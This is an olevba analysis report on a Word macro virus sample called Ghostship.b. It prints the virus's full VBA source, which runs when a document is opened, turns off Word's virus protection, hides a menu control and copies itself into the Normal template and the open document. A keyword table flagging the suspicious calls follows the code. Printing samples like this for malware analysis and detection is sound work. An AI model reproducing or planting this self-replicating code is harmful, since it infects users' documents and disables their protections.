olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ghostship.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ghostship.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
VirName = GhostShip
Engine = DarkLord + LordArz
NormInstalled = False
ActInstalled = False
Options.VirusProtection = False
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
'Infection way based on the old GhostShip Version
'New infection engine: TDIE by Dark Lord and Lord Arz
NormalTemplate.VBProject.VBComponents(1).export ("c:\Normal.bas")
ActiveDocument.VBProject.VBComponents(1).export ("c:\Document.bas")

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "VIRNAME = GHOSTSHIP" Then NormInstalled = True
If UCase(AI) = "VIRNAME = GHOSTSHIP" Then ActInstalled = True

If NormInstalled = True And ActIntalled = True Then GoTo PayLoad

If NormInstalled = True Then IW = "c:\Normal.bas" Else IW = "C:\Document.bas"
Open IW For Input As #1
VirCode = "Private Sub Document_Open()" & Chr(13)
Do
Line Input #1, SRCLine
Loop Until SRCLine = "Private Sub Document_Open()"
Do Until SRCLine = "End Sub"
Line Input #1, SRCLine
VirCode = VirCode & SRCLine & Chr(13)
Loop

If NormInstalled = False Then
Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 1, Lines
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If
If ActInstalled = False Then
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.deletelines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
End If

Close
Kill ("C:\Normal.bas")
Kill ("C:\Document.bas")
PayLoad:
WrittenBy = LordArz
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

